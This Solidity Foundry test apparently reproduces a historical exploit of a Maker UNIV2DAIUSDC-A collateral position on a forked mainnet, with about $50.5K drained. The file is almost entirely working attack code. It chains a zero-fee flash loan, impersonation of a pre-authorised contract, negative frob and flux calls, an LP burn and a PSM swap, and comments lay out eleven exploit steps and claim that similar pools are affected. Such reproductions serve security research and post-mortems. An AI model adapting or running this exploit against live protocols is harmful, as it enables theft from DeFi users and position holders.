// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~$50.5K
// Attacker : https://etherscan.io/address/0xdfdea277f6b44270bcb804997d1e6cc4ad8407db
// Attack Contract : https://etherscan.io/address/0xfd51531b26f9be08240f7459eea5be80d5b047d9
// Vulnerable Contract : https://etherscan.io/address/0xae461ca67b15dc8dc81ce7615e0320da1a9ab8d5
// Attack Tx : https://etherscan.io/tx/0xa4e650772f6e6b7ecc0964fe4c3854850669d1467570a2fa2b6edfa0f112c4b7

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xae461ca67b15dc8dc81ce7615e0320da1a9ab8d5#code

// @Analysis
// Post-mortem : https://app.blocksec.com/explorer/tx/eth/0xa4e650772f6e6b7ecc0964fe4c3854850669d1467570a2fa2b6edfa0f112c4b7
// Twitter Guy :
// Hacking God :
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./../interface.sol";

interface IMakerPool {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
}

struct Urn {
    uint256 ink; // Locked Collateral  [wad]
    uint256 art; // Normalised Debt    [wad]
}

struct Ilk {
    uint256 Art; // Total Normalised Debt     [wad]
    uint256 rate; // Accumulated Rates         [ray]
    uint256 spot; // Price with Safety Margin  [ray]
    uint256 line; // Debt Ceiling              [rad]
    uint256 dust; // Urn Debt Floor            [rad]
}

interface IMakerVat {
    function urns(bytes32, address) external view returns (Urn memory);
    function hope(
        address
    ) external;
    function heal(
        uint256
    ) external;
    function ilks(
        bytes32
    ) external view returns (Ilk memory);
}

interface IMakerManager {
    function urns(
        uint256
    ) external view returns (address);
    function join(address, uint256) external;
    function flux(uint256, address, uint256) external;
    function frob(uint256, int256, int256) external;
    function open(bytes32, address) external returns (uint256);
    function cdpAllow(uint256, address, uint256) external;
}

interface IUniv2 {
    function exit(address, uint256) external;
}

interface IUniv2Token {
    function burn(
        address
    ) external returns (uint256, uint256);
}

interface Mcd {
    function sellGem(address, uint256) external;
}

contract Circle is BaseTestWithBalanceLog {
    address private constant maker = 0x1EB4CF3A948E7D72A198fe073cCb8C7a948cD853;
    address private constant susd = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
    address private constant dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    address maker_cdp_manager = 0x5ef30b9986345249bc32d8928B7ee64DE9435E39;
    address maker_mcd_join_dai = 0x9759A6Ac90977b93B58547b4A71c78317f391A28;
    address make_mcd_vat = 0x35D1b3F3D7966A1DFe207aa4514C12a259A0492B;
    address univ2 = 0xA81598667AC561986b70ae11bBE2dd5348ed4327;
    address univ2_token = 0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5;
    address mcd = 0x89B78CfA322F6C5dE0aBcEecab66Aee45393cC5A;

    address circle = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address allower = 0x0A59649758aa4d66E25f08Dd01271e891fe52199;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8545", 15_331_020 - 1);
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Begin] Attacker Circle before exploit", IERC20(circle).balanceOf(address(this)), 6
        );
        uint256 amount = 2_437_926_935_218_598_618_037_988;
        bytes memory data =
            "0x0000000000000000000000000000000000000000000000000000000000006e970000000000000000000000000000000000000000000000000000000000000000";
        IMakerPool(maker).flashLoan(address(this), dai, amount, data);
        emit log_named_decimal_uint("[End] Attacker Circle after exploit", IERC20(circle).balanceOf(address(this)), 6);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // VULNERABILITY: Mispriced UniswapV2 LP Collateral Valuation in Maker UNIV2DAIUSDC-A Ilk (CDP Partial Close Arbitrage)
        // Root cause: Maker's Vat accounting + ilk-specific oracle for UNIV2DAIUSDC-A (bytes32 ilk = 0x554e495632444149555344432d4100...) valued locked LP collateral (Urn.ink) using a spot price [ray] (see Ilk.spot read at L124) that was lower than the actual economic redemption value of those LP tokens. The LP (UNIV2 token at 0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5) when burned against the real pair reserves (via burn()) redeems pro-rata DAI+USDC at current balances/totalSupply (see UniswapV2Pair.burn in sources/...). Because frob only enforces the (under)priced spot*ink >= art*rate invariant, a partial unwind (reducing art via dart while extracting dink) released collateral whose market value exceeded the debt slice repaid.
        // Code references:
        //   - L121: address urns_address = ...urns(28_311); Urn memory urn = IMakerVat(...).urns(ilk, urns_address);  // ink=locked LP, art=normalized debt
        //   - L123: Ilk memory ilk = ...ilks(ilk);  // contains .spot used for collateralization checks inside Vat.frob
        //   - L136: IMakerManager(...).frob(28_311, -1_104_761_777_152_681_125 /*-dink= -ink/4*/, -2_419_153_952_397_280_665_329_975 /*-dart=-art/4*/);
        //   - L139: flux + L140: IUniv2(univ2).exit(...) gets LP ERC20 (GemJoin just does vat.slip + transfer)
        //   - L142: IERC20(univ2_token).transfer(...) ; IUniv2Token(univ2_token).burn(...)  --> receives amount0/amount1 > accounted value
        //   - L145: Mcd(mcd).sellGem(...) which is DssPsm.sellGem (tin=0) using AuthGemJoin5 to convert USDC->DAI 1:1
        //   - The flash lender (L109) and PSM provide zero-cost roundtrip for the DAI leg.
        // Why it works: (1) cdpAllow pre-granted to 0xfd515...047d9 lets attacker call frob/flux without being owner (L133 prank). (2) 0-fee DSS flash supplies the DAI to join for the dart reduction. (3) LP burn value delta is captured as USDC because PSM is 1:1 and no slippage in this tx. (4) No sanity check in frob path or GemJoin or LP adapter that redemption value >= system valuation.
        // Impact: ~$50.5k USDC extracted from the CDP position (attacker ends with profit after flash repay). The position's embedded surplus value (difference between burn redemption and oracle-backed debt capacity) is drained. Any holder of such a CDP with cdpAllow to a prepared attacker contract, or the owner themselves, could repeat. Affects all UNIV2 LP ilks with similar pricing gaps vs. on-chain redemption.
        //
        // EXPLOIT STEPS:
        // 1. (pre-tx) The attacker address 0xdfdea2... grants cdpAllow(CDP=28311, 0xfd51531b26f9Be08240f7459Eea5BE80D5B047D9, 1) on DssCdpManager so that address can frob/flux.
        // 2. testExploit() calls IMakerPool(maker).flashLoan(this, DAI, 2_437_926_935_218_598_618_037_988, data) -- 0-fee ERC3156 flash from Maker DSS.
        // 3. onFlashLoan: resolve urn = manager.urns(28311); read current Urn{ink,art} and Ilk{spot,...} from Vat (purely informational here).
        // 4. balance DAI, approve DaiJoin, DaiJoin.join(urn, amount) -- burns ERC20 DAI and moves internal DAI into the urn so that dart reduction won't underflow Vat dai balance.
        // 5. prank as authorized 0xfd51... ; manager.frob(cdp, -dink, -dart) -- this calls into Vat.frob which (a) decreases ink, (b) decreases art, (c) moves the dart DAI from urn to cover the debt burn. Because spot was low, the post-frob position still satisfies the collateralization check.
        // 6. prank again; manager.flux(cdp, this, dink) -- moves the freed gem (LP) from urn's locked collateral into the caller's gem balance inside Vat.
        // 7. GemJoin.exit(this, dink) -- vat.slip(ilk, msg.sender, -dink); gem.transfer(this, dink) -- now attacker holds the actual ERC20 LP.
        // 8. LP.transfer(pair, dink); pair.burn(this) -- executes the standard pro-rata redemption using current reserves (see UniswapV2Pair.burn L429-449), receiving real DAI + USDC whose sum > value of dart repaid.
        // 9. USDC.approve(AuthGemJoin, max); PSM.sellGem(this, 1193139061611) -- AuthGemJoin5.join (scales 6->18), Vat.frob on USDC PSM ilk (mints DAI), DaiJoin.exit (receives DAI). tin=0 so no fee.
        // 10. DAI.approve(flash, max); return magic bytes32 -- flash lender pulls back principal (covered exactly by DAI from burn + PSM). Leftover USDC = profit.
        // 11. (end) Attacker's Circle/USDC balance increased by the delta.

        address urns_address = IMakerManager(maker_cdp_manager).urns(28_311);
        Urn memory urn = IMakerVat(make_mcd_vat).urns(
            0x554e495632444149555344432d41000000000000000000000000000000000000, urns_address
        );

        Ilk memory ilk =
            IMakerVat(make_mcd_vat).ilks(0x554e495632444149555344432d41000000000000000000000000000000000000);

        uint256 amount_dai = IERC20(dai).balanceOf(address(this));
        IERC20(dai).approve(maker_mcd_join_dai, amount_dai);

        IMakerManager(maker_mcd_join_dai).join(urns_address, amount_dai);

        cheats.prank(0xfd51531b26f9Be08240f7459Eea5BE80D5B047D9); // borrow the authority of cdp 28311 (assigned before)  // VULN: cdpAllow is the access vector enabling non-owner frob
        // dink = 0-urn.ink/4 = -1104761777152681125
        // dart = 0-urn.art/4 = -2419153952397280665329975
        IMakerManager(maker_cdp_manager).frob(28_311, -1_104_761_777_152_681_125, -2_419_153_952_397_280_665_329_975);  // VULN: frob with negative dink/dart on underpriced LP collateral extracts surplus
        cheats.prank(0xfd51531b26f9Be08240f7459Eea5BE80D5B047D9);
        IMakerManager(maker_cdp_manager).flux(28_311, address(this), 1_104_761_777_152_681_125);
        IUniv2(univ2).exit(address(this), 1_104_761_777_152_681_125);

        IERC20(univ2_token).transfer(univ2_token, 1_104_761_777_152_681_125);
        (uint256 amount0, uint256 amount1) = IUniv2Token(univ2_token).burn(address(this));  // VULN: burn redeems at TRUE reserve value >> Maker's spot-priced valuation

        IERC20(circle).approve(allower, type(uint256).max);
        Mcd(mcd).sellGem(address(this), 1_193_139_061_611);  // VULN: 1:1 PSM conversion (tin=0) lets attacker convert USDC leg back to DAI costlessly
        IERC20(dai).approve(maker, type(uint256).max);
        return 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9;
    }
}
